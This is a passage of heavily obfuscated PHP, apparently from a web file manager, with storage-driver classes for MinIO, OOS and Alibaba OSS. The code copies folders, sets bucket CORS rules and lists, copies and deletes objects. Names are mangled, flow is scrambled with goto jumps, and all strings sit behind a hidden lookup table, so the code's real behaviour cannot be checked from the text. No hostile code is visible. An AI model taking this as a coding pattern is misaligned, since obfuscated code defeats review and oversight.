Model($d¬›ÅƒïÓÖ[532])->where($bŒ‘ö™ÏÕ…)->save(array($d¬›ÅƒïÓÖ[444] => 0)); Model($d¬›ÅƒïÓÖ[533])->where($bŒ‘ö™ÏÕ…)->delete(); goto F³¼Àƒ²Í; F³¼Àƒ²Í: } public function copyFolderFromIO($aßôòõ‘Ç, $FËÏğ­‚, $E „Ê”ÆÛ, $Fè¢·ØÖé¥, $B§³ÁæŠáÃ, $aƒ‹ù ›âÔ = false) { goto dÁ³ÊÑ›„; CÖ“ĞÅŸ©å: $this->updateModifyTime($E „Ê”ÆÛ); return $C£¼¾èÈØ; goto fƒÅÙØ ˜ø; eÍ²¸Åœ: Model($eÎĞ¶Ï‡Œ¡[418])->linkAdd($e›îìŒÄÚ[$eÎĞ¶Ï‡Œ¡[497]]); Model($eÎĞ¶Ï‡Œ¡[418])->remove($e›îìŒÄÚ[$eÎĞ¶Ï‡Œ¡[534]]); $this->folderSizeReset($E „Ê”ÆÛ); goto CÖ“ĞÅŸ©å; EÚ±•Ş¢ø–: $B†•ÌÀï‘ = $this->fileNameExist($E „Ê”ÆÛ, $a¿©¢Š†ã); $C£¼¾èÈØ = $this->mkdir($E „Ê”ÆÛ, $a¿©¢Š†ã, $Fè¢·ØÖé¥); if (!$B†•ÌÀï‘ || $Fè¢·ØÖé¥ == REPEAT_RENAME_FOLDER) { $Fè¢·ØÖé¥ = !1; } goto B¯ÆÈë†ÙŞ; bµÅµìŒš»: Hook::trigger($eÎĞ¶Ï‡Œ¡[536]); if ($C£¼¾èÈØ) { $this->folderSizeResetChildren($C£¼¾èÈØ); } $this->_childrenListClear(); goto BĞ‰Ê¦šßÌ; B¯ÆÈë†ÙŞ: if ($B†•ÌÀï‘) { $this->_childrenAllMake($B†•ÌÀï‘); } Hook::trigger($eÎĞ¶Ï‡Œ¡[535]); $this->_copyChildTo($aßôòõ‘Ç, $FËÏğ­‚, $C£¼¾èÈØ, $Fè¢·ØÖé¥, $e›îìŒÄÚ, $B§³ÁæŠáÃ); goto bµÅµìŒš»; BĞ‰Ê¦šßÌ: Model($eÎĞ¶Ï‡Œ¡[500])->addAll($e›îìŒÄÚ[$eÎĞ¶Ï‡Œ¡[498]], array(), !0); Model($eÎĞ¶Ï‡Œ¡[501])->eventCopy($C£¼¾èÈØ); $this->saveAll($e›îìŒÄÚ[$eÎĞ¶Ï‡Œ¡[499]]); goto eÍ²¸Åœ; dÁ³ÊÑ›„: $eÎĞ¶Ï‡Œ¡ =& $_SERVER[Ö¹ñÒÁ²÷]; $e›îìŒÄÚ = array($eÎĞ¶Ï‡Œ¡[498] => array(), $eÎĞ¶Ï‡Œ¡[499] => array(), $eÎĞ¶Ï‡Œ¡[497] => array(), $eÎĞ¶Ï‡Œ¡[534] => array()); $a¿©¢Š†ã = $aƒ‹ù ›âÔ ? $aƒ‹ù ›âÔ : $aßôòõ‘Ç->getPathName($aßôòõ‘Ç->pathThis($FËÏğ­‚)); goto EÚ±•Ş¢ø–; fƒÅÙØ ˜ø: } private function _copyChildTo($c«Ğˆíï, $eæêÍÈˆˆÉ, $cÍ‘ñ§Ïœ , $bâ»¡ë‰‹Ì, &$dêÒæß¹—, $c†ˆ…øÇ±) { goto aš¹¿ğ; fóá˜‹¨˜é: $BôäóÕ´Æ = $this->_childrenList($cÍ‘ñ§Ïœ ); $BôäóÕ´Æ = array_to_keyvalue($BôäóÕ´Æ, $Fƒ¡¤‘Šô[28]); foreach ($c©•ìÄ‹ù„ as $cÚš”ˆ‰) { $b‰Šê¬Ëˆ = $BôäóÕ´Æ[$cÚš”ˆ‰[$Fƒ¡¤‘Šô[28]]]; $Eùè‰›¼Ç„ = $b‰Šê¬Ëˆ[$Fƒ¡¤‘Šô[365]]; $this->_copyApplyMeta($b‰Šê¬Ëˆ, $dêÒæß¹—); if ($cÚš”ˆ‰[$Fƒ¡¤‘Šô[29]] == $Fƒ¡¤‘Šô[76]) { $cÚš”ˆ‰[$Fƒ¡¤‘Šô[75]] = $c«Ğˆíï->getPathInner($cÚš”ˆ‰[$Fƒ¡¤‘Šô[75]]); $this->_copyChildTo($c«Ğˆíï, $cÚš”ˆ‰[$Fƒ¡¤‘Šô[75]], $Eùè‰›¼Ç„, $bâ»¡ë‰‹Ì, $dêÒæß¹—, $c†ˆ…øÇ±); } } goto A­£Óã°¨ê; aš¹¿ğ: $Fƒ¡¤‘Šô =& $_SERVER[Ö¹ñÒÁ²÷]; $E·âĞéšŒ’ = $this->sourceInfoCache($cÍ‘ñ§Ïœ ); $EÆÓî¤š—š = $c«Ğˆíï->listPath($eæêÍÈˆˆÉ, !1, !0); goto Cºšøä¤ñŞ; d·¨Éˆóá¤: foreach ($c©•ìÄ‹ù„ as &$cÚš”ˆ‰) { goto EÌÃœ«¡¸; EÌÃœ«¡¸: if (isset($DÑ—…Øèœ›[$cÚš”ˆ‰[$Fƒ¡¤‘Šô[28]]])) { $cÚš”ˆ‰ = $DÑ—…Øèœ›[$cÚš”ˆ‰[$Fƒ¡¤‘Šô[28]]]; } $cÚš”ˆ‰[$Fƒ¡¤‘Šô[366]] = $cÚš”ˆ‰[$Fƒ¡¤‘Šô[29]] == $Fƒ¡¤‘Šô[76]; $cÚš”ˆ‰[$Fƒ¡¤‘Šô[368]] = _get($cÚš”ˆ‰, $Fƒ¡¤‘Šô[156], $Fƒ¡¤‘Šô[33]); goto EéŞˆÚïÍ‘; a´‹»¬Ò†œ: if ($bâ»¡ë‰‹Ì) { $CŠ²ƒÈ»È = $this->fileNameExistCache($cÍ‘ñ§Ïœ , $cÚš”ˆ‰[$Fƒ¡¤‘Šô[28]]); if ($CŠ²ƒÈ»È) { if ($cÚš”ˆ‰[$Fƒ¡¤‘Šô[366]] || $bâ»¡ë‰‹Ì == REPEAT_SKIP) { continue; } if ($bâ»¡ë‰‹Ì == REPEAT_REPLACE) { $b‰Šê¬Ëˆ = $this->sourceInfoCache($CŠ²ƒÈ»È); $D¢×ŒŒ¡á = $this->fileHistory($b‰Šê¬Ëˆ, $cÚš”ˆ‰[$Fƒ¡¤‘Šô[415]], $cÚš”ˆ‰[$Fƒ¡¤‘Šô[77]]); if ($D¢×ŒŒ¡á) { $dêÒæß¹—[$Fƒ¡¤‘Šô[497]][] = $cÚš”ˆ‰[$Fƒ¡¤‘Šô[415]]; } continue; } else { if ($bâ»¡ë‰‹Ì == REPEAT_RENAME) { $cÚš”ˆ‰[$Fƒ¡¤‘Šô[28]] = $this->fileNameAutoCache($cÍ‘ñ§Ïœ , $cÚš”ˆ‰[$Fƒ¡¤‘Šô[28]], $bâ»¡ë‰‹Ì, !1); } } } } if (!$cÚš”ˆ‰[$Fƒ¡¤‘Šô[366]] && $cÚš”ˆ‰[$Fƒ¡¤‘Šô[415]]) { $dêÒæß¹—[$Fƒ¡¤‘Šô[497]][] = $cÚš”ˆ‰[$Fƒ¡¤‘Šô[415]]; } $b•ç÷ô®ØÄ[] = $this->_makeItemData($cÚš”ˆ‰, $E·âĞéšŒ’, $cÚš”ˆ‰[$Fƒ¡¤‘Šô[28]]); goto cõŞÎ´Ü˜‰; EéŞˆÚïÍ‘: $cÚš”ˆ‰[$Fƒ¡¤‘Šô[77]] = _get($cÚš”ˆ‰, $Fƒ¡¤‘Šô[77], 0); $cÚš”ˆ‰[$Fƒ¡¤‘Šô[415]] = _get($cÚš”ˆ‰, $Fƒ¡¤‘Šô[415], 0); if (!isset($cÚš”ˆ‰[$Fƒ¡¤‘Šô[537]]) && $cÚš”ˆ‰[$Fƒ¡¤‘Šô[415]]) { $dêÒæß¹—[$Fƒ¡¤‘Šô[534]][] = $cÚš”ˆ‰[$Fƒ¡¤‘Šô[415]]; } goto a´‹»¬Ò†œ; cõŞÎ´Ü˜‰: } unset($cÚš”ˆ‰); if (!empty($b•ç÷ô®ØÄ)) { $this->addAll($b•ç÷ô®ØÄ); } goto fóá˜‹¨˜é; Cºšøä¤ñŞ: $c©•ìÄ‹ù„ = array_merge($EÆÓî¤š—š[$Fƒ¡¤‘Šô[73]], $EÆÓî¤š—š[$Fƒ¡¤‘Šô[74]]); $DÑ—…Øèœ› = $this->_addFiles($c«Ğˆíï, $EÆÓî¤š—š[$Fƒ¡¤‘Šô[73]], $c†ˆ…øÇ±); $b•ç÷ô®ØÄ = array(); goto d·¨Éˆóá¤; A­£Óã°¨ê: } private function _addFiles($FÃéÁŸ¼œÇ, $e‡âŠ¦², $dÅ°ÍŠÙÛ) { goto CëÛø¡¦¥ì; c­æµ‘©‚ò: foreach ($cî‰Ä¯¥ as $FÆ¯ä·§İ…) { if (!isset($eñÃ…İ™‘¸[$FÆ¯ä·§İ…[$d°âŠÙ›šª[159]]])) { continue; } $Aòö’î¬§… =& $eñÃ…İ™‘¸[$FÆ¯ä·§İ…[$d°âŠÙ›šª[159]]]; foreach ($Aòö’î¬§… as &$F›—ŸÇ‰ò‰) { $F›—ŸÇ‰ò‰[$d°âŠÙ›šª[415]] = $FÆ¯ä·§İ…[$d°âŠÙ›šª[415]]; } unset($F›—ŸÇ‰ò‰); } $Aë¨°óÁĞ„ = array(); foreach ($e‡âŠ¦² as $c‘‚À©Ïå) { $Aë¨°óÁĞ„[$c‘‚À©Ïå[$d°âŠÙ›šª[28]]] = $c‘‚À©Ïå; } goto AöÒÊÉ; CëÛø¡¦¥ì: $d°âŠÙ›šª =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$e‡âŠ¦² || count($e‡âŠ¦²) == 0) { return array(); } $eñÃ…İ™‘¸ = array(); goto b™æ¢ÛË»÷; Eê›ÑîŸÃ: $fƒ„³÷£©Î = array($d°âŠÙ›šª[159] => array($d°âŠÙ›šª[7], array_keys($eñÃ…İ™‘¸))); $cî‰Ä¯¥ = $D–…ğ¶Şí½->where($fƒ„³÷£©Î)->select(); $cî‰Ä¯¥ = $cî‰Ä¯¥ ? $cî‰Ä¯¥ : array(); goto c­æµ‘©‚ò; D¦…çßğÙ: $a¿…Ö‘ÎÔ³ = array(); foreach ($e‡âŠ¦² as $AÅÏÌ˜°Šù) { if (isset($AÅÏÌ˜°Šù[$d°âŠÙ›šª[537]]) && $AÅÏÌ˜°Šù[$d°âŠÙ›šª[537]]) { continue; } $b±Íğõ¥ö¸ = $FÃéÁŸ¼œÇ->getPathInner($AÅÏÌ˜°Šù[$d°âŠÙ›šª[75]]); $b‰¨Ã´İÇ = $D–…ğ¶Şí½->addFileMake($b±Íğõ¥ö¸, $AÅÏÌ˜°Šù[$d°âŠÙ›šª[77]], $AÅÏÌ˜°Šù[$d°âŠÙ›šª[160]], $AÅÏÌ˜°Šù[$d°âŠÙ›šª[159]], $AÅÏÌ˜°Šù[$d°âŠÙ›šª[28]], $dÅ°ÍŠÙÛ); $a¿…Ö‘ÎÔ³[] = $b‰¨Ã´İÇ; } $D–…ğ¶Şí½->addAll($a¿…Ö‘ÎÔ³); goto Eê›ÑîŸÃ; AöÒÊÉ: return $Aë¨°óÁĞ„; goto c»¯àÆ‘Ìë; f²‡†¦–‰: $cî‰Ä¯¥ = $D–…ğ¶Şí½->where($fƒ„³÷£©Î)->select(); $cî‰Ä¯¥ = $cî‰Ä¯¥ ? $cî‰Ä¯¥ : array(); foreach ($cî‰Ä¯¥ as $FÆ¯ä·§İ…) { if (!isset($eñÃ…İ™‘¸[$FÆ¯ä·§İ…[$d°âŠÙ›šª[159]]])) { continue; } $B†“Ñ ÜÑ´ = $eñÃ…İ™‘¸[$FÆ¯ä·§İ…[$d°âŠÙ›šª[159]]]; foreach ($B†“Ñ ÜÑ´ as &$F›—ŸÇ‰ò‰) { $F›—ŸÇ‰ò‰[$d°âŠÙ›šª[415]] = $FÆ¯ä·§İ…[$d°âŠÙ›šª[415]]; $F›—ŸÇ‰ò‰[$d°âŠÙ›šª[537]] = !0; } unset($F›—ŸÇ‰ò‰); } goto D¦…çßğÙ; b™æ¢ÛË»÷: foreach ($e‡âŠ¦² as &$F›—ŸÇ‰ò‰) { goto F‹¿Ì»öğ; E‚ˆË´†œÖ: if (count($eñÃ…İ™‘¸[$a‘˜ä·‡]) > 1) { $F›—ŸÇ‰ò‰[$d°âŠÙ›šª[537]] = !0; } goto d…É»Û˜¿ç; c†âÙÓ’ø: $F›—ŸÇ‰ò‰[$d°âŠÙ›šª[159]] = $a‘˜ä·‡; Hook::trigger($d°âŠÙ›šª[539], $F›—ŸÇ‰ò‰); $eñÃ…İ™‘¸[$a‘˜ä·‡][] =& $F›—ŸÇ‰ò‰; goto E‚ˆË´†œÖ; e‡¾ì¬ØÍ‹: $a‘˜ä·‡ = $FÃéÁŸ¼œÇ->hashMd5($F›—ŸÇ‰ò‰[$d°âŠÙ›šª[75]]); if (strlen($a‘˜ä·‡) > 10 && !isset($eñÃ…İ™‘¸[$a‘˜ä·‡])) { $eñÃ…İ™‘¸[$a‘˜ä·‡] = array(); } $F›—ŸÇ‰ò‰[$d°âŠÙ›šª[160]] = $D§´µ—¢ã; goto c†âÙÓ’ø; F‹¿Ì»öğ: Hook::trigger($d°âŠÙ›šª[538], $F›—ŸÇ‰ò‰); $F›—ŸÇ‰ò‰[$d°âŠÙ›šª[75]] = $FÃéÁŸ¼œÇ->getPathInner($F›—ŸÇ‰ò‰[$d°âŠÙ›šª[75]]); $D§´µ—¢ã = $FÃéÁŸ¼œÇ->hashSimple($F›—ŸÇ‰ò‰[$d°âŠÙ›šª[75]]); goto e‡¾ì¬ØÍ‹; d…É»Û˜¿ç: } $fƒ„³÷£©Î = array($d°âŠÙ›šª[159] => array($d°âŠÙ›šª[7], array_keys($eñÃ…İ™‘¸))); $D–…ğ¶Şí½ = Model($d°âŠÙ›šª[540]); goto f²‡†¦–‰; c»¯àÆ‘Ìë: } } define($_SERVER[Ö¹ñÒÁ²÷][541], $_SERVER[Ö¹ñÒÁ²÷][542]); goto F µŞ‹…Ï; FÍ¤—¹è›Û: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($DáÇ™‡µËÙ) { parent::__construct($DáÇ™‡µËÙ); $this->signatureVersion($_SERVER[Ö¹ñÒÁ²÷][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($dÔ¤«Ô÷ƒß) { parent::__construct($dÔ¤«Ô÷ƒß); $this->signatureVersion($_SERVER[Ö¹ñÒÁ²÷][196]); } public function fileOutLink($F¢²ŞãšÄÕ) { $Fóİùö¬ëñ =& $_SERVER[Ö¹ñÒÁ²÷]; if (substr($F¢²ŞãšÄÕ, 0, 7) == $Fóİùö¬ëñ[1102]) { $F¢²ŞãšÄÕ = $Fóİùö¬ëñ[1103] . substr($F¢²ŞãšÄÕ, 7); } header($Fóİùö¬ëñ[152] . $F¢²ŞãšÄÕ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($E¿Ø¶¢öÓË) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ö¹ñÒÁ²÷][1157]; $this->_init($E¿Ø¶¢öÓË); } public function _init($bÏÀÎ¬©òŠ) { foreach ($bÏÀÎ¬©òŠ as $dÜ—í§ã¤ => $Cµø¸ÖÇ‡) { if (isset($this->{$dÜ—í§ã¤})) { $this->{$dÜ—í§ã¤} = $Cµø¸ÖÇ‡; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Ö¹ñÒÁ²÷][1158], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto A¿£ø½®¦ä; A¿£ø½®¦ä: $BîÑ°—å†Ö =& $_SERVER[Ö¹ñÒÁ²÷]; $CáÂËëî = new OSS\Model\CorsConfig(); $fäÚƒÉÂ = new OSS\Model\CorsRule(); goto EºÕæÄÚ–; b­­¹÷Ãæ‚: $fäÚƒÉÂ->setMaxAgeSeconds(600); $fäÚƒÉÂ->addExposeHeader($BîÑ°—å†Ö[1164]); $fäÚƒÉÂ->addAllowedHeader($BîÑ°—å†Ö[1159]); goto b¡ÇâêÂåŒ; EºÕæÄÚ–: $fäÚƒÉÂ->addAllowedOrigin($BîÑ°—å†Ö[1159]); $fäÚƒÉÂ->addAllowedMethod($BîÑ°—å†Ö[1160]); $fäÚƒÉÂ->addAllowedMethod($BîÑ°—å†Ö[1161]); goto aÌ”ˆ¦œà£; b¡ÇâêÂåŒ: $CáÂËëî->addRule($fäÚƒÉÂ); try { $this->client->putBucketCors($this->bucket, $CáÂËëî); } catch (OSS\Core\OssException $D¾÷«’ƒ¬²) { return !1; } return !0; goto e¥¿Ç›ğ’­; aÌ”ˆ¦œà£: $fäÚƒÉÂ->addAllowedMethod($BîÑ°—å†Ö[1162]); $fäÚƒÉÂ->addAllowedMethod($BîÑ°—å†Ö[1163]); $fäÚƒÉÂ->addAllowedMethod($BîÑ°—å†Ö[151]); goto b­­¹÷Ãæ‚; e¥¿Ç›ğ’­: } public function getBucketCors() { goto F…©¸Ş‰Ï¸; D¯Š¼›¯‚²: $BÄ¾ø™œ¨ = $A¨šé¥Ë–¶[0]->getMaxAgeSeconds(); $dÁåŸŸšÚâ = $A¨šé¥Ë–¶[0]->getExposeHeaders(); $BÉö¨ä¹ï = $A¨šé¥Ë–¶[0]->getAllowedHeaders(); goto AÏÃŸˆÚí; E§¸øŒ’¯º: if (!$fíøêÖ‰ãæ || !($A¨šé¥Ë–¶ = $fíøêÖ‰ãæ->getRules())) { return null; } $fÇ±ˆªùí‘ = $A¨šé¥Ë–¶[0]->getAllowedOrigins(); $då÷ñ†ÛØô = $A¨šé¥Ë–¶[0]->getAllowedMethods(); goto D¯Š¼›¯‚²; AÏÃŸˆÚí: return array($D‘°§’‰[171] => isset($fÇ±ˆªùí‘[0]) ? $fÇ±ˆªùí‘[0] : $D‘°§’‰[33], $D‘°§’‰[175] => $då÷ñ†ÛØô, $D‘°§’‰[1165] => $BÄ¾ø™œ¨, $D‘°§’‰[1166] => isset($dÁåŸŸšÚâ[0]) ? $dÁåŸŸšÚâ[0] : $D‘°§’‰[33], $D‘°§’‰[173] => isset($BÉö¨ä¹ï[0]) ? $BÉö¨ä¹ï[0] : $D‘°§’‰[33]); goto fé¹˜‡‚•Ü; F…©¸Ş‰Ï¸: $D‘°§’‰ =& $_SERVER[Ö¹ñÒÁ²÷]; $fíøêÖ‰ãæ = null; try { $fíøêÖ‰ãæ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $AîÊªì¶»•) { return null; } goto E§¸øŒ’¯º; fé¹˜‡‚•Ü: } public function isBucketCors() { goto FÜ÷àì›’; FÜ÷àì›’: $bÛÏÆùƒ =& $_SERVER[Ö¹ñÒÁ²÷]; $FÜÑ à¸» = $this->getBucketCors(); if (!$FÜÑ à¸» || !is_array($FÜÑ à¸»)) { return !1; } goto Fñ¸áªãÕ; Eñ„à¡ï¼Ü: $EÜš‡‰±ò = array($bÛÏÆùƒ[176], $bÛÏÆùƒ[177], $bÛÏÆùƒ[178], $bÛÏÆùƒ[179], $bÛÏÆùƒ[180]); $D‚‹Ÿ“¿¨¥ = array_diff($EÜš‡‰±ò, $FŒÙÛôïĞâ); return empty($D‚‹Ÿ“¿¨¥); goto B¶†ÅÒÉœÖ; Fñ¸áªãÕ: if ($FÜÑ à¸»[$bÛÏÆùƒ[171]] != $bÛÏÆùƒ[172] || $FÜÑ à¸»[$bÛÏÆùƒ[173]] != $bÛÏÆùƒ[172]) { return !1; } $FŒÙÛôïĞâ = array_map($bÛÏÆùƒ[174], $FÜÑ à¸»[$bÛÏÆùƒ[175]]); if (!is_array($FŒÙÛôïĞâ)) { $FŒÙÛôïĞâ = array(); } goto Eñ„à¡ï¼Ü; B¶†ÅÒÉœÖ: } public function mkfile($Eäàï¬Øîµ, $e½öº‚µ¼ß = '', $b›×ìòá¾Ü = REPEAT_RENAME) { $Aš½ê¡Š¢¼ = $this->setContent($Eäàï¬Øîµ, $e½öº‚µ¼ß); if ($Aš½ê¡Š¢¼ !== !1) { return $this->getPathOuter($Eäàï¬Øîµ); } return !1; } public function mkdir($CÉ¢Ë”‚…ß, $E·ŞÓëŠ‹¥ = REPEAT_SKIP) { if ($this->_isFolder($CÉ¢Ë”‚…ß)) { return $this->getPathOuter($CÉ¢Ë”‚…ß); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($CÉ¢Ë”‚…ß)); } catch (OSS\Core\OssException $bë°“­•»²) { return !1; } return $this->getPathOuter($CÉ¢Ë”‚…ß); } private function fileList($Fë¨©¯¯ï, $CÆ™ Ö†ÈÂ = '', $BùãæÜÑÑµ = 0) { goto Aš•”ŸêŞ; A‰áĞ´ÄÜ: $FŞ½˜ç å = $Cª¬ªÔ¥ñ[33]; $AÈäŞ›ñ‚‡ = 1000; $fĞ…ˆ¯‰á = $fø‰·óéá = array(); goto aÍˆ‰‘Åƒè; aÍˆ‰‘Åƒè: while (!0) { $B•Ä‡Í‚Û¸ = array($Cª¬ªÔ¥ñ[1167] => $CÆ™ Ö†ÈÂ, $Cª¬ªÔ¥ñ[182] => $cËÏº°—Æ¤, $Cª¬ªÔ¥ñ[1168] => $AÈäŞ›ñ‚‡, $Cª¬ªÔ¥ñ[1169] => $FŞ½˜ç å); try { $Díäµª‹º¸ = $this->client->listObjects($this->bucket, $B•Ä‡Í‚Û¸); } catch (OSS\Core\OssException $DÀÇ‚ì¯­) { break; } $FŞ½˜ç å = $Díäµª‹º¸->getNextMarker(); $c¡öÎ–ñŒ« = $Díäµª‹º¸->getObjectList(); $e…íµ¬Ì‹ = $Díäµª‹º¸->getPrefixList(); foreach ($c¡öÎ–ñŒ« as $DâÎ´…™¾Á) { if ($DâÎ´…™¾Á->getKey() == $cËÏº°—Æ¤) { continue; } $CÖÅóÔğÌ = $DâÎ´…™¾Á->getKey(); if ($BùãæÜÑÑµ) { $CÖÅóÔğÌ = array($Cª¬ªÔ¥ñ[28] => $CÖÅóÔğÌ, $Cª¬ªÔ¥ñ[77] => $DâÎ´…™¾Á->getSize(), $Cª¬ªÔ¥ñ[186] => strtotime($DâÎ´…™¾Á->getLastModified())); } $fø‰·óéá[] = $CÖÅóÔğÌ; } foreach ($e…íµ¬Ì‹ as $bóÃ–»Şª) { $fĞ…ˆ¯‰á[] = $bóÃ–»Şª->getPrefix(); } if ($FŞ½˜ç å === $Cª¬ªÔ¥ñ[33]) { break; } } return array($Cª¬ªÔ¥ñ[74] => $fĞ…ˆ¯‰á, $Cª¬ªÔ¥ñ[73] => $fø‰·óéá); goto Dİ·¸ÉæĞ; Aš•”ŸêŞ: $Cª¬ªÔ¥ñ =& $_SERVER[Ö¹ñÒÁ²÷]; $Fë¨©¯¯ï = trim($Fë¨©¯¯ï, $Cª¬ªÔ¥ñ[8]); $cËÏº°—Æ¤ = empty($Fë¨©¯¯ï) ? $Cª¬ªÔ¥ñ[33] : $Fë¨©¯¯ï . $Cª¬ªÔ¥ñ[8]; goto A‰áĞ´ÄÜ; Dİ·¸ÉæĞ: } public function copyFile($F‘Ô¥„éÙˆ, $fá×í÷™£“) { $AàºõÖ†¶ = $this->size($F‘Ô¥„éÙˆ); if ($AàºõÖ†¶ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $F‘Ô¥„éÙˆ, $this->bucket, $this->pathEncode($fá×í÷™£“)); } catch (OSS\Core\OssException $a»«£ìÜÊæ) { return !1; } return !0; } return $this->multiCopyObject($F‘Ô¥„éÙˆ, $fá×í÷™£“, $AàºõÖ†¶); } private function multiCopyObject($eÊæÀ·å¨, $F©‹·ˆÕ»Î, $bâ°‘¾ˆÇÁ) { $a×©ÅÚ†Ş¾ =& $_SERVER[Ö¹ñÒÁ²÷]; try { goto f‰“ùËã¨ß; D®“ÌçÇ: $Fğ¶ÎÓÎª = 1024 * 1024 * 10; $eé…Õ¹œ = $this->client->generateMultiuploadParts($bâ°‘¾ˆÇÁ, $Fğ¶ÎÓÎª); foreach ($eé…Õ¹œ as $FãŒÆ‹‹÷³ => $EÁôŠÜ­İ•) { $eò‘­ºˆ¨  = $b©ˆ®„šâö + (int) $EÁôŠÜ­İ•[$a×©ÅÚ†Ş¾[1171]]; $c¨˜¦ï¯ª = (int) $EÁôŠÜ­İ•[$a×©ÅÚ†Ş¾[321]] + $eò‘­ºˆ¨  - 1; $d¬‘®©¶Ã¸ = array($a×©ÅÚ†Ş¾[1172] => $eò‘­ºˆ¨ , $a×©ÅÚ†Ş¾[1173] => $c¨˜¦ï¯ª); $d×…šÜî¾½[] = $this->client->uploadPartCopy($this->bucket, $eÊæÀ·å¨, $this->bucket, $this->pathEncode($F©‹·ˆÕ»Î), $a’ĞåÏƒ‰Á, $cåÖ±à‚ï, $d¬‘®©¶Ã¸); $a’ĞåÏƒ‰Á = $a’ĞåÏƒ‰Á + 1; } goto bò®ˆ¼Í¬‹; C²•¨Üé¸µ: $a’ĞåÏƒ‰Á = 1; $b©ˆ®„šâö = 0; $d×…šÜî¾½ = array(); goto D®“ÌçÇ; bò®ˆ¼Í¬‹: $A—›·ãïôÉ = array(); foreach ($d×…šÜî¾½ as $FãŒÆ‹‹÷³ => $B¡Ÿ­ß„¥‘) { $A—›·ãïôÉ[] = array($a×©ÅÚ†Ş¾[1174] => $FãŒÆ‹‹÷³ + 1, $a×©ÅÚ†Ş¾[1175] => $B¡Ÿ­ß„¥‘); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($F©‹·ˆÕ»Î), $cåÖ±à‚ï, $A—›·ãïôÉ); goto F®‹°Şèæ½; f‰“ùËã¨ß: $c†µœ­¶Ø¢ = array(); if ($f¥­Šœ”Íõ = $this->hashMd5($eÊæÀ·å¨)) { $c†µœ­¶Ø¢ = array(OSS\OssClient::OSS_HEADERS => array($a×©ÅÚ†Ş¾[1170] => $f¥­Šœ”Íõ)); } $cåÖ±à‚ï = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($F©‹·ˆÕ»Î), $c†µœ­¶Ø¢); goto C²•¨Üé¸µ; F®‹°Şèæ½: } catch (OSS\Core\OssException $f¥“ïÇÔ) { return !1; } return !0; } public function moveFile($d•ä” ß´õ, $e½Ü«âŞõÖ) { if ($this->copyFile($d•ä” ß´õ, $e½Ü«âŞõÖ)) { $this->remove($d•ä” ß´õ); return !0; } return !1; } public function delFile($b™œñËÒÃ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($b™œñËÒÃ)); } catch (OSS\Core\OssException $då•ºÖ¥°ë) { return !1; } return !0; } public function delFolder($B‡ó–£ÙœÓ) { $Dã…ÁĞ¸¼É =& $_SERVER[Ö¹ñÒÁ²÷]; $EÂáìîõ¿È = $this->fileList($B‡ó–£ÙœÓ); if (!empty($B‡ó–£ÙœÓ) && !in_array(trim($B‡ó–£ÙœÓ, $Dã…ÁĞ¸¼É[8]) . $Dã…ÁĞ¸¼É[8], $EÂáìîõ¿È[$Dã…ÁĞ¸¼É[73]])) { $EÂáìîõ¿È[$Dã…ÁĞ¸¼É[73]][] = trim($B‡ó–£ÙœÓ, $Dã…ÁĞ¸¼É[8]) . $Dã…ÁĞ¸¼É[8]; } foreach (array_chunk($EÂáìîõ¿È[$Dã…ÁĞ¸¼É[73]], 1000) as $d¥Ú®•»Œ©) { try { $this->client->deleteObjects($this->bucket, $d¥Ú®•»Œ©); } catch (OSS\Core\OssException $Aª‚öÓ‚ÓŒ) { continue; } } return !0; } public function rename($Cš‰«á»Šë, $cšâªùƒà‡) { return $this->renameObject($Cš‰«á»Šë, $cšâªùƒà‡); } private function fileInfo($Fî½Ø‘»¯Ğ, $A¢ß“»–á = array()) { goto eï·ì¨ùœ¢; fÛ»ÅĞ÷ãè: if (isset($A¢ß“»–á[$C¤„Ö¡ïóÈ[77]])) { $DŸ ÆÏ†Ã[$C¤„Ö¡ïóÈ[77]] = $A¢ß“»–á[$C¤„Ö¡ïóÈ[77]]; } if (isset($A¢ß“»–á[$C¤„Ö¡ïóÈ[106]])) { $DŸ ÆÏ†Ã[$C¤„Ö¡ïóÈ[106]] = $A¢ß“»–á[$C¤„Ö¡ïóÈ[106]]; } if (isset($A¢ß“»–á[$C¤„Ö¡ïóÈ[186]]) && !trim($DŸ ÆÏ†Ã[$C¤„Ö¡ïóÈ[106]])) { $DŸ ÆÏ†Ã[$C¤„Ö¡ïóÈ[106]] = $A¢ß“»–á[$C¤„Ö¡ïóÈ[186]]; } goto Fä½ÌÛ¤ø; eï·ì¨ùœ¢: $C¤„Ö¡ïóÈ =& $_SERVER[Ö¹ñÒÁ²÷]; $DŸ ÆÏ†Ã = array($C¤„Ö¡ïóÈ[28] => $this->pathThis($Fî½Ø‘»¯Ğ), $C¤„Ö¡ïóÈ[75] => $this->getPathOuter($Fî½Ø‘»¯Ğ), $C¤„Ö¡ïóÈ[29] => $C¤„Ö¡ïóÈ[163], $C¤„Ö¡ïóÈ[183] => 0, $C¤„Ö¡ïóÈ[106] => 0, $C¤„Ö¡ïóÈ[77] => 0, $C¤„Ö¡ïóÈ[156] => $this->ext($Fî½Ø‘»¯Ğ), $C¤„Ö¡ïóÈ[184] => !0, $C¤„Ö¡ïóÈ[185] => !0); if (empty($A¢ß“»–á)) { $EËÍ˜¨ß = $this->objectMeta($Fî½Ø‘»¯Ğ); if (!$EËÍ˜¨ß) { return $DŸ ÆÏ†Ã; } $A¢ß“»–á = array($C¤„Ö¡ïóÈ[106] => strtotime($EËÍ˜¨ß[$C¤„Ö¡ïóÈ[1176]]), $C¤„Ö¡ïóÈ[77] => $EËÍ˜¨ß[$C¤„Ö¡ïóÈ[1177]] + 